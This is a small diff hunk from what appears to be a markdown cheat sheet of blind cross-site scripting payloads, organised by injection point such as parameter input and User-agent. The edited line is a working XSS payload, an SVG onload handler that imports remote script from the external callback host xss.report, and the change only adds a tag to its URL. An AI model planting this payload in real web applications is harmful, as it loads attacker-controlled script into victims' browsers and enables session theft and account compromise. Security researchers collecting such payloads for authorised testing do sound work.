@@ -12,7 +12,7 @@
 ```
 #### Parameter input
 ```
-<svg/onload=import('//xss.report/c/hnterx')>
+<svg/onload=import('//xss.report/c/hnterx?svg')>
 ```
 #### User-agent
 ```
